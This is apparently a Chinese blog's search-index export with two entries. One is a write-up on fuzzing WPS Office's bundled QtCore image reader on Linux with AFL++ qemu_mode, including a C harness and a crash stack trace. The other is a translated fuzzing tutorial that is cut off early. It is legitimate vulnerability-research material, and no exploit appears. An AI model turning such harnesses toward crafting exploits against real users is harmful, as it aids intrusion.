<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>对wps的qtcore的某一接口fuzz</title>
    <link href="/2022/03/29/wps%20fuzz/"/>
    <url>/2022/03/29/wps%20fuzz/</url>
    
    <content type="html"><![CDATA[<p>主要看到以下三篇<code>blog</code></p><blockquote><p><a href="http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html">http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html</a><br><a href="https://www.anquanke.com/post/id/240938">https://www.anquanke.com/post/id/240938</a><br><a href="https://ruan777.github.io/2021/06/02/%E4%BD%BF%E7%94%A8winafl%E5%AF%B9qtcore%E7%9A%84%E4%B8%80%E6%AC%A1fuzz%E5%B0%9D%E8%AF%95">https://ruan777.github.io/2021/06/02/使用winafl对qtcore的一次fuzz尝试</a></p></blockquote><p>因此尝试对<code>linux</code>上的<code>wps</code>的<code>qtcore4</code>进行<code>fuzz</code></p><pre><code class="hljs yaml"><span class="hljs-string">环境：</span><span class="hljs-attr">linux:</span> <span class="hljs-string">ubuntu</span> <span class="hljs-number">20.04</span><span class="hljs-attr">wps:</span> <span class="hljs-number">11.1</span><span class="hljs-number">.0</span><span class="hljs-number">.10161</span><span class="hljs-attr">libcQtCore:</span> <span class="hljs-number">4.7</span><span class="hljs-number">.4</span></code></pre><h2 id="整体的逻辑"><a href="#整体的逻辑" class="headerlink" title="整体的逻辑"></a>整体的逻辑</h2><p>根据<code>Nafiez</code>的报告，可以知道，主要是<code>kso.dll</code>中调用<code>QtCore4.dll</code>的<code>QImageReader::read()</code>出错的，因此后续两篇文章均对于<code>QtCore4.dll</code>的该接口进行<code>fuzz</code></p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>:<span class="hljs-number">000</span>&gt; !heap -p -a cc<span class="hljs-number">53</span>afbc    <span class="hljs-attribute">address</span> cc<span class="hljs-number">53</span>afbc found in    <span class="hljs-attribute">_DPH_HEAP_ROOT</span> @ <span class="hljs-number">6731000</span>    <span class="hljs-attribute">in</span> busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)                                <span class="hljs-attribute">cc36323c</span>:         cc<span class="hljs-number">53</span>afa<span class="hljs-number">8</span>               <span class="hljs-number">58</span> -         cc<span class="hljs-number">53</span>a<span class="hljs-number">000</span>             <span class="hljs-number">2000</span>    <span class="hljs-attribute">6f13ab70</span> verifier!AVrfDebugPageHeapAllocate+<span class="hljs-number">0</span>x<span class="hljs-number">00000240</span>    <span class="hljs-attribute">77a9909b</span> ntdll!RtlDebugAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">00000039</span>    <span class="hljs-attribute">779ebbad</span> ntdll!RtlpAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>ed    <span class="hljs-attribute">779eb0cf</span> ntdll!RtlpAllocateHeapInternal+<span class="hljs-number">0</span>x<span class="hljs-number">0000022</span>f    <span class="hljs-attribute">779eae8e</span> ntdll!RtlAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">0000003</span>e    <span class="hljs-attribute">6f080269</span> MSVCR<span class="hljs-number">100</span>!malloc+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>b    <span class="hljs-attribute">6f08233b</span> MSVCR<span class="hljs-number">100</span>!operator new+<span class="hljs-number">0</span>x<span class="hljs-number">0000001</span>f    <span class="hljs-attribute">6b726c67</span> QtCore<span class="hljs-number">4</span>!QImageData::create+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>fa    <span class="hljs-attribute">6b726b54</span> QtCore<span class="hljs-number">4</span>!QImage::QImage+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>e    <span class="hljs-attribute">6b7a0e21</span> QtCore<span class="hljs-number">4</span>!png_get_text+<span class="hljs-number">0</span>x<span class="hljs-number">00000436</span>    <span class="hljs-attribute">6b79d7a8</span> QtCore<span class="hljs-number">4</span>!QImageIOHandler::setFormat+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>de    <span class="hljs-attribute">6b79d457</span> QtCore<span class="hljs-number">4</span>!QPixmapData::fromFile+<span class="hljs-number">0</span>x<span class="hljs-number">000002</span>bf    <span class="hljs-attribute">6b725eb4</span> QtCore<span class="hljs-number">4</span>!QImageReader::read+<span class="hljs-number">0</span>x<span class="hljs-number">000001</span>e<span class="hljs-number">2</span>    <span class="hljs-attribute">6d0ca585</span> kso!kpt::VariantImage::forceUpdateCacheImage+<span class="hljs-number">0</span>x<span class="hljs-number">0000254</span>e    <span class="hljs-attribute">6d0c5964</span> kso!kpt::Direct<span class="hljs-number">2</span>DPaintEngineHelper::operator=+<span class="hljs-number">0</span>x<span class="hljs-number">00000693</span>    <span class="hljs-attribute">6d0c70d0</span> kso!kpt::RelativeRect::unclipped+<span class="hljs-number">0</span>x<span class="hljs-number">00001146</span>    <span class="hljs-attribute">6d0c8d0c</span> kso!kpt::VariantImage::forceUpdateCacheImage+<span class="hljs-number">0</span>x<span class="hljs-number">00000</span>cd<span class="hljs-number">5</span>    <span class="hljs-attribute">6d451d5c</span> kso!BlipCacheMgr::BrushCache+<span class="hljs-number">0</span>x<span class="hljs-number">0000049</span>a    <span class="hljs-attribute">6d451e85</span> kso!BlipCacheMgr::GenerateBitmap+<span class="hljs-number">0</span>x<span class="hljs-number">0000001</span>d    <span class="hljs-attribute">6d453227</span> kso!BlipCacheMgr::GenCachedBitmap+<span class="hljs-number">0</span>x<span class="hljs-number">00000083</span>    <span class="hljs-attribute">6d29bb92</span> kso!drawing::PictureRenderLayer::render+<span class="hljs-number">0</span>x<span class="hljs-number">000009</span>b<span class="hljs-number">6</span>    <span class="hljs-attribute">6d450fb1</span> kso!drawing::RenderTargetImpl::paint+<span class="hljs-number">0</span>x<span class="hljs-number">00000090</span>    <span class="hljs-attribute">6d29b528</span> kso!drawing::PictureRenderLayer::render+<span class="hljs-number">0</span>x<span class="hljs-number">0000034</span>c    <span class="hljs-attribute">6d2a2d83</span> kso!drawing::VisualRenderer::render+<span class="hljs-number">0</span>x<span class="hljs-number">00000060</span>    <span class="hljs-attribute">6d2b8970</span> kso!drawing::SingleVisualRenderer::drawNormal+<span class="hljs-number">0</span>x<span class="hljs-number">000002</span>b<span class="hljs-number">5</span>    <span class="hljs-attribute">6d2b86a7</span> kso!drawing::SingleVisualRenderer::draw+<span class="hljs-number">0</span>x<span class="hljs-number">000001</span>e<span class="hljs-number">1</span>    <span class="hljs-attribute">6d2b945e</span> kso!drawing::SingleVisualRenderer::draw+<span class="hljs-number">0</span>x<span class="hljs-number">00000046</span>    <span class="hljs-attribute">6d3d0142</span> kso!drawing::ShapeVisual::paintEvent+<span class="hljs-number">0</span>x<span class="hljs-number">0000044</span>a    <span class="hljs-attribute">680a2b5c</span> wpsmain!WpsShapeTreeVisual::getHittestSubVisuals+<span class="hljs-number">0</span>x<span class="hljs-number">000068</span>f<span class="hljs-number">1</span>    <span class="hljs-attribute">6d0e36df</span> kso!AbstractVisual::visualEvent+<span class="hljs-number">0</span>x<span class="hljs-number">00000051</span>    <span class="hljs-attribute">6d3cbe97</span> kso!drawing::ShapeVisual::visualEvent+<span class="hljs-number">0</span>x<span class="hljs-number">0000018</span>f    <span class="hljs-attribute">6d0eba90</span> kso!VisualPaintEvent::arriveVisual+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>e</code></pre><p>后续两篇文章<code>fuzz</code>的代码逻辑为</p><pre><code class="hljs maxima">QImage <span class="hljs-built_in">image</span>;QImageReader reader;QString image_file_name;# <span class="hljs-built_in">transform</span> (char[] <span class="hljs-built_in">file_name</span>) to (QString image_file_name)reader.setFileName(image_file_name)reader.<span class="hljs-built_in">read</span>(<span class="hljs-built_in">image</span>);</code></pre><h2 id="从windows到linux"><a href="#从windows到linux" class="headerlink" title="从windows到linux"></a>从windows到linux</h2><p>在迁移的时候，就去找了一下对应的<code>libQtCore.so.4.7.4</code>的接口，得到了以下的代码</p><pre><code class="hljs c"><span class="hljs-comment">// gcc -g -masm=intel ./qt_reader.c -ldl -no-pie -o qt_reader</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;dlfcn.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;    dlopen(<span class="hljs-string">&quot;/path/libc++.so.1&quot;</span>, RTLD_LAZY);    dlopen(<span class="hljs-string">&quot;/path/libpng12.so.0&quot;</span>, RTLD_LAZY);    dlopen(<span class="hljs-string">&quot;/path/libc++abi.so.1&quot;</span>, RTLD_LAZY);    <span class="hljs-keyword">void</span>* handle = dlopen(<span class="hljs-string">&quot;/path/libQtCore.so.4.7.4&quot;</span>, RTLD_LAZY);    <span class="hljs-keyword">if</span> (handle == <span class="hljs-number">0</span>)    &#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;open handle failed&quot;</span>);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, dlerror());        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;        <span class="hljs-comment">// QImageReader::QImageReader(QImageReader *this)</span>    <span class="hljs-keyword">void</span> (*qt_qimageReader)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReaderC2Ev&quot;</span>);    <span class="hljs-comment">// QImageReader::read(QImageReader *this, QImage *a2)</span>    <span class="hljs-keyword">void</span> (*qt_qimageReader_read)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReader4readEP6QImage&quot;</span>);    <span class="hljs-comment">// QImageReader::setFileName(QImageReader *this, const QString *a2)</span>    <span class="hljs-keyword">void</span> (*qt_setFileName)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReader11setFileNameERK7QString&quot;</span>);    <span class="hljs-comment">// QString::QString(QString *this, const QChar *)</span>    <span class="hljs-keyword">void</span> (*qt_qstring)() = dlsym(handle, <span class="hljs-string">&quot;_ZN7QStringC2EPK5QChar&quot;</span>);    <span class="hljs-comment">// QString::fromLatin1(QString *this, const char *, unsigned int)</span>    <span class="hljs-keyword">void</span> (*qt_qstring_fromlatin1)() = dlsym(handle, <span class="hljs-string">&quot;_ZN7QString10fromLatin1EPKci&quot;</span>);    <span class="hljs-comment">// QImage::QImage(QImage *this)</span>    <span class="hljs-keyword">void</span> (*qt_qimage)() = dlsym(handle, <span class="hljs-string">&quot;_ZN6QImageC2Ev&quot;</span>);    <span class="hljs-comment">// QFile::exists(QFile *__hidden this)</span>    <span class="hljs-keyword">void</span> (*qt_qfile_exits)() = dlsym(handle, <span class="hljs-string">&quot;_ZNK5QFile6existsEv&quot;</span>);    <span class="hljs-comment">// QFile::close()</span>    <span class="hljs-keyword">void</span> (*qt_close)() = dlsym(handle, <span class="hljs-string">&quot;_ZN5QFile5closeEv&quot;</span>);    <span class="hljs-keyword">char</span>* image = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<span class="hljs-keyword">char</span>* qstring = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<span class="hljs-keyword">char</span>* reader = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);    <span class="hljs-keyword">char</span>* file_name = argv[<span class="hljs-number">1</span>];    <span class="hljs-comment">// pusha</span>    __asm__ __volatile__(        <span class="hljs-string">&quot;push rax\n&quot;</span>        <span class="hljs-string">&quot;push rbx\n&quot;</span>        <span class="hljs-string">&quot;push rcx\n&quot;</span>          <span class="hljs-string">&quot;push rdx\n&quot;</span>              <span class="hljs-string">&quot;push rbp\n&quot;</span>              <span class="hljs-string">&quot;push rdi\n&quot;</span>              <span class="hljs-string">&quot;push rsi\n&quot;</span>              <span class="hljs-string">&quot;push r8\n&quot;</span>              <span class="hljs-string">&quot;push r9\n&quot;</span>              <span class="hljs-string">&quot;push r10\n&quot;</span>              <span class="hljs-string">&quot;push r11\n&quot;</span>              <span class="hljs-string">&quot;push r12\n&quot;</span>              <span class="hljs-string">&quot;push r13\n&quot;</span>              <span class="hljs-string">&quot;push r14\n&quot;</span>              <span class="hljs-string">&quot;push r15\n&quot;</span>        <span class="hljs-string">&quot;push r15\n&quot;</span>);    <span class="hljs-comment">// QImage::QImage(image)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(image), <span class="hljs-string">&quot;a&quot;</span>(qt_qimage)    );        <span class="hljs-comment">// QImageReader::QImageReader(reader)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_qimageReader)    );    <span class="hljs-comment">// **************** This is a wrong interface of transforming the char to QString ***********************</span>    <span class="hljs-comment">// // QString::QString(qstring, file_name)</span>    <span class="hljs-comment">// __asm__ __volatile__ (</span>    <span class="hljs-comment">//     &quot;call rax\n&quot;</span>    <span class="hljs-comment">//     :</span>    <span class="hljs-comment">//     : &quot;D&quot;(qstring), &quot;S&quot;(file_name), &quot;a&quot;(qt_qstring)</span>    <span class="hljs-comment">// );</span>    <span class="hljs-comment">// QString::fromLatin1(QString *this, const char *, unsigned int)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(qstring), <span class="hljs-string">&quot;S&quot;</span>(file_name), <span class="hljs-string">&quot;d&quot;</span>(<span class="hljs-built_in">strlen</span>(file_name)), <span class="hljs-string">&quot;a&quot;</span>(qt_qstring_fromlatin1)    );    <span class="hljs-comment">// QImageReader::setFileName(reader, qstring)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;S&quot;</span>(qstring), <span class="hljs-string">&quot;a&quot;</span>(qt_setFileName)    );    <span class="hljs-comment">// QFile::exits(qfile) qfile = reader+0x10</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;mov rsi, [rdi]\n&quot;</span>        <span class="hljs-string">&quot;mov rdi, [rsi+0x10]\n&quot;</span>        <span class="hljs-string">&quot;call rax\n&quot;</span>        <span class="hljs-string">&quot;test al, al\n&quot;</span>        <span class="hljs-string">&quot;je error\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_qfile_exits)    );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;file exists&quot;</span>);    <span class="hljs-comment">// QImageReader::read(reader, qimage)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;S&quot;</span>(image), <span class="hljs-string">&quot;a&quot;</span>(qt_qimageReader_read)    );        <span class="hljs-comment">// QFile::close()</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;mov rsi, [rdi]\n&quot;</span>        <span class="hljs-string">&quot;mov rdi, [rsi+0x10]\n&quot;</span>        <span class="hljs-string">&quot;call rax\n&quot;</span>        <span class="hljs-string">&quot;jmp out\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_close)    );    <span class="hljs-comment">// error:</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;error:\n&quot;</span>    );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error: file not exists&quot;</span>);    <span class="hljs-comment">// popa</span>    __asm__ __volatile__(        <span class="hljs-string">&quot;out:\n&quot;</span>        <span class="hljs-string">&quot;pop r15\n&quot;</span>        <span class="hljs-string">&quot;pop r15\n&quot;</span>        <span class="hljs-string">&quot;pop r14\n&quot;</span>        <span class="hljs-string">&quot;pop r13\n&quot;</span>        <span class="hljs-string">&quot;pop r12\n&quot;</span>        <span class="hljs-string">&quot;pop r11\n&quot;</span>        <span class="hljs-string">&quot;pop r10\n&quot;</span>        <span class="hljs-string">&quot;pop r9\n&quot;</span>        <span class="hljs-string">&quot;pop r8\n&quot;</span>        <span class="hljs-string">&quot;pop rsi\n&quot;</span>        <span class="hljs-string">&quot;pop rdi\n&quot;</span>        <span class="hljs-string">&quot;pop rbp\n&quot;</span>        <span class="hljs-string">&quot;pop rdx\n&quot;</span>        <span class="hljs-string">&quot;pop rcx\n&quot;</span>        <span class="hljs-string">&quot;pop rbx\n&quot;</span>        <span class="hljs-string">&quot;pop rax\n&quot;</span>        );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>这个地方，最开始写的时候，撸了一版跟后两篇一样的接口的代码，但是发现覆盖率并没有上升，最后调的时候，发现在<code>reader.read()</code>的第一次判断支持的文件格式（<code>bmp, png, jpg ...</code>）以及文件是否存在时，就发现程序自身就走到了<code>File Not found</code>的地方</p><p>无奈只能重新调试程序，最后找到了一个<code>QFile::exists()</code>接口，调试的时候，发现<code>QFile</code>中存储的路径的<code>QString</code>跟我用<code>QString::QString()</code>的数据结构并不一致，就换了一个<code>QString::fromLatin1()</code>接口，就能成功地跑起来了</p><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>在写好板子之后就想要用<code>afl</code>的<code>qemu_mode</code>进行插桩<code>fuzz</code>，折腾了半天，感觉<code>afl</code>原本的<code>qemu</code>版本以及<code>patch</code>和<code>libc</code>的接口都太老了</p><p>最后听学长的直接整<code>afl++</code>的<code>qemu_mode</code></p><p>最初<code>fuzz</code>起来的时候，并没过多的设置，但是这样的话是全插桩，像<code>dlopen</code>的一些库都是不关心以及没必要的，而且在<code>afl++</code>的窗口也看的出来，基本上覆盖率都是不上升的，而且极低（0.10%）</p><p>利用<code>./afl-qemu-trace -D 1.txt -d exec,nochain ./qt_reader /tmp/1.png</code>记录下来<code>trace</code>，发现不同文件的<code>trace</code>差距还是很明显的，说明代码并没有写崩</p><p>最后利用<code>export AFL_INST_LIBS=1</code>给库函数也插桩之后就可以跑起来了</p><p>另外也可以通过<code>AFL_QEMU_INST_RANGES</code>设置<code>range</code>，进行范围的插桩，通过以下代码获取相关<code>.so</code>的内存地址范围</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">lm</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">link_map</span>*)<span class="hljs-title">handle</span>;</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;base:%p\n&quot;</span>, lm-&gt;l_addr);</code></pre><p>另外翻了一下<code>afl</code>的源码，可以看到如果<code>cur_loc &gt;= afl_inst_rms</code>则<code>return</code>，所以如果给库插桩还是要注意是否超过了<code>MAP_SIZE</code>，否则最后的比较关心的<code>.so</code>没插桩上</p><pre><code class="hljs c"><span class="hljs-comment">/* Instrumentation ratio: */</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> afl_inst_rms = MAP_SIZE;<span class="hljs-comment">/* The equivalent of the tuple logging routine from afl-as.h. */</span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afl_maybe_log</span><span class="hljs-params">(abi_ulong cur_loc)</span> </span>&#123;  <span class="hljs-keyword">static</span> __thread abi_ulong prev_loc;  <span class="hljs-comment">/* Optimize for cur_loc &gt; afl_end_code, which is the most likely case on</span><span class="hljs-comment">     Linux systems. */</span>  <span class="hljs-keyword">if</span> (cur_loc &gt; afl_end_code || cur_loc &lt; afl_start_code || !afl_area_ptr)    <span class="hljs-keyword">return</span>;  <span class="hljs-comment">/* Looks like QEMU always maps to fixed locations, so ASAN is not a</span><span class="hljs-comment">     concern. Phew. But instruction addresses may be aligned. Let&#x27;s mangle</span><span class="hljs-comment">     the value to get something quasi-uniform. */</span>  cur_loc  = (cur_loc &gt;&gt; <span class="hljs-number">4</span>) ^ (cur_loc &lt;&lt; <span class="hljs-number">8</span>);  cur_loc &amp;= MAP_SIZE - <span class="hljs-number">1</span>;  <span class="hljs-comment">/* Implement probabilistic instrumentation by looking at scrambled block</span><span class="hljs-comment">     address. This keeps the instrumented locations stable across runs. */</span>  <span class="hljs-keyword">if</span> (cur_loc &gt;= afl_inst_rms) <span class="hljs-keyword">return</span>;  afl_area_ptr[cur_loc ^ prev_loc]++;  prev_loc = cur_loc &gt;&gt; <span class="hljs-number">1</span>;&#125;</code></pre><h2 id="其他-踩坑"><a href="#其他-踩坑" class="headerlink" title="其他 踩坑"></a>其他 <del>踩坑</del></h2><h3 id="reader-setFileName"><a href="#reader-setFileName" class="headerlink" title="reader.setFileName"></a>reader.setFileName</h3><p>一开始我想去找<code>houjingyi</code>师傅是如何得到<code>reader.setFileName</code>接口在<code>reader.read()</code>之前被调用了的，因此我去尝试调试<code>linux</code>下的<code>wpsoffice</code>打开<code>docx</code>的操作</p><p>在<code>wpsoffice</code>最初并未加载<code>libQtCore.so.4.7.4</code>时，给<code>pthread_create</code>下断点，<code>continue</code>之后再给<code>libQtCore.so.4.7.4</code>中的<code>QImageReader.read()</code>和<code>QImageReader.setFileName()</code>下断点，但是其实最后并没有很明显的看出来，在调用<code>reader.read()</code>之前调用了<code>reader.setFileName()</code></p><p>最后去询问<code>houjingyi</code>师傅，才知道，师傅是直接根据程序代码逻辑，认为<code>reader.read()</code>之前肯定有对于设置图片路径<code>reader.setFileName()</code>的操作（感觉自己的思维有点局限了，老是想明明白白调出来调用的接口和顺序，实际上全然没管开发者在开发时候的代码逻辑）</p><p>P.S. 说起来，调试 <code>wpsoffice</code> 的程序的时候，觉得特别神奇，<code>wpsoffice</code>会运行<strong>两次</strong><code>_start</code>，在第一次<code>_start</code>的时候，可以看到<code>wpsoffice</code>在加载自己的程序的窗口，在第一次<code>_start</code>的最后会<code>jmp</code>第二次的<code>_start</code>，第二次的<code>wps</code>窗口，显示正在加载<code>docx</code>文件，因此当时我调试的时候，猜测第一次<code>_start</code>的时候，是在利用<code>QtCore</code>加载自己窗口，而第二次才是渲染解析<code>docx</code>文件，但是最后还是没调出来</p><h3 id="QString-QString"><a href="#QString-QString" class="headerlink" title="QString::QString"></a>QString::QString</h3><p>这个接口转换出来的并不是<code>QString</code>坑了我一段时间，最后找到<code>QFile::exists()</code>接口的时候，才发现，<code>QString::QString</code>转换出来的不是<code>QString</code></p><h3 id="AFL-INST-LIBS-AFL-QEMU-INST-RANGES"><a href="#AFL-INST-LIBS-AFL-QEMU-INST-RANGES" class="headerlink" title="AFL_INST_LIBS AFL_QEMU_INST_RANGES"></a>AFL_INST_LIBS AFL_QEMU_INST_RANGES</h3><p>不设置这两个的话，是不会给<code>dlopen</code>打开的库函数插桩的</p><h3 id="fuzz-断掉继续跑"><a href="#fuzz-断掉继续跑" class="headerlink" title="fuzz 断掉继续跑"></a>fuzz 断掉继续跑</h3><p>设置输入参数为<code>-i-</code> ，就可以读入 <code>fuzz_out/default/_resume</code>中的内容，继续跑</p><h3 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h3><p>顺手试了一波<code>Qt5.12.9</code>，最后跑的时候，是出现了<code>WARNING: Instrumentation output varies across runs.</code>，发现是出现了<code>ASLR</code>的情况，照理来说<code>qemu</code>应该不会出现这种情况，但是怎么解决，不太清楚</p><p>另外试了一下<code>qasan</code>也无法进行插桩检测，感觉还得再整整</p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>afl++</tag>
      
      <tag>qemu_mode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing Like A Caveman 翻译</title>
    <link href="/2022/03/29/fuzzing%20like%20a%20caveman/"/>
    <url>/2022/03/29/fuzzing%20like%20a%20caveman/</url>
    
    <content type="html"><![CDATA[<p>原文为 <a href="https://h0mbre.github.io/Fuzzing-Like-A-Caveman">Fuzzing-Like-A-Caveman</a>，本文章仅为个人理解的翻译和备份</p><p>[toc]</p><h2 id="Intoduction"><a href="#Intoduction" class="headerlink" title="Intoduction"></a>Intoduction</h2><p>在过去的几个月里，我一直在被动地消化大量与模糊测试相关的材料，因为我主要尝试将我的<code>Windows exploitation game</code>从<code>Noob-level</code>提高到<code>1%-Less-Noob-Level</code>，而且我发现它相当的迷人，在这篇文章中，我将向你们展示如何创建一个非常简单变异的<code>fuzzer</code>，希望我们可以利用这个<code>fuzzer</code>在一些开源项目中找到一些<code>crashes</code>。</p><p>我们将创建的这个<code>fuzzer</code>是跟随着 <a href="https://twitter.com/gynvael?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">@gynvael’s fuzzing tutorial on YouTube</a>实现的，我不知道<code>Gynvael</code>有视频，所以现在我有几十个小时的内容可以添加到无止尽的<code>watch/read</code>列表中。</p><p>我也必须要说<a href="https://www.youtube.com/user/gamozolabs/videos">Brandon Faulk’s fuzzing streams</a>是非常好的，虽然我不能理解近乎<code>99%</code>的<code>Brandon says</code>所说的事情，但是这些视频的内容是吸引人的，到目前为止，我个人最喜欢的是他对<code>calc.exe</code>和<code>c-tags</code>的<code>fuzzing</code>，他也有一个关于<code>fuzzing</code>概念特别好的介绍的视频：<a href="https://www.youtube.com/watch?v=SngK4W4tVc0">NYU Fuzzing Talk</a></p><h2 id="Picking-a-Target"><a href="#Picking-a-Target" class="headerlink" title="Picking a Target"></a>Picking a Target</h2><p>我想找一个用<code>C</code>或者<code>C++</code>写的从文件中解析数据的<code>binary</code>，我最先找到的其中一个就是从<code>images</code>中解析<code>Exif</code>数据的<code>binaries</code>，我们也想选一个几乎没有安全隐患的目标，因为我们将会实时的公布这些发现。</p><p>从<a href="https://www.media.mit.edu/pia/Research/deepview/exif.html">exif</a>可知，基本上，<code>Exif</code>文件格式是跟<code>JPEG</code>文件格式是相同的，<code>Exif</code>插入一些<code>image/digicam</code>信息数据和缩略图 (<code>thumbnail image</code>) 到<code>JPEG</code>中以符合<code>JPEG</code>的规范，因此你可以通过<code>JEPG</code>兼容的浏览器/图片查看器/图片修饰软件等查看<code>Exif</code>格式的文件，就像通常查看<code>JPEG</code>文件一样。</p><p>因此，<code>Exif</code>可将元数据类型插入到符合<code>JPEG</code>规范的文件中，并且市面上存在不少有助于解析这些数据的<code>programs/utilities</code>。</p><h2 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h2><p>我们将用<code>Python3</code>去构建一个初级的变异的<code>fuzzer</code>，巧妙地（或者不那么巧妙地）改变合规的<code>Exif-filled</code>的<code>JPEGs</code>，并将它们喂给解析器希望能得到<code>crash</code>，我们还将开发<code>x86 Kali Linux</code>发行版。</p><p>首先，我们需要一个合规的<code>Exif-filled</code>的<code>JPEG</code>，谷歌搜素<code>Sample JPEG with Exif</code>就有助于我们找到这个<a href="https://github.com/ianare/exif-samples/tree/master/jpg">repo</a>，我将会用<code>Canon_40D.jpg</code>用于测试。</p><h2 id="Getting-to-Know-the-JPEG-and-EXIF-Spec"><a href="#Getting-to-Know-the-JPEG-and-EXIF-Spec" class="headerlink" title="Getting to Know the JPEG and EXIF Spec"></a>Getting to Know the JPEG and EXIF Spec</h2><p>在我们将<code>Python</code>写入<code>Sublime Text</code>之前，让我们首先花一点来了解<code>JPEG</code>和<code>Exif</code>规范，一遍我们可以避免一些更明显的损坏图像，以至于解析器不会试图解析它以浪费宝贵的<code>fuzzing cycles</code>。</p><p>从前文提到的<a href="https://www.media.mit.edu/pia/Research/deepview/exif.html">规范概述</a>可知所有的<code>JPEG</code>图片都是以<code>0xFFD8</code>开头，以<code>0xFFD9</code>结尾，这前几个字节就是所谓的<code>magic bytes</code>，在<code>*Nix system</code>中通过<code>magic bytes</code>可以直接识别出文件类型。</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# file Canon_40D.jpg Canon_40D.jpg: JPEG image data, JFIF standard <span class="hljs-number">1.01</span>, resolution (DPI), density <span class="hljs-number">72</span>x72, segment length <span class="hljs-number">16</span>, Exif Standard: [TIFF image data, little-endian, direntries=<span class="hljs-number">11</span>, manufacturer=Canon, model=Canon EOS <span class="hljs-number">40</span>D, orientation=upper-left, xresolution=<span class="hljs-number">166</span>, yresolution=<span class="hljs-number">174</span>, resolutionunit=<span class="hljs-number">2</span>, software=GIMP <span class="hljs-number">2.4</span><span class="hljs-number">.5</span>, datetime=<span class="hljs-number">2008</span>:<span class="hljs-number">07</span>:<span class="hljs-number">31</span> <span class="hljs-number">10</span>:<span class="hljs-number">38</span>:<span class="hljs-number">11</span>, GPS-Data], baseline, precision <span class="hljs-number">8</span>, <span class="hljs-number">100</span>x68, components <span class="hljs-number">3</span></code></pre><p>我们可以去掉<code>.jpg</code>并获得相同的输出</p><pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>kali:~# file CanonCanon: JPEG image 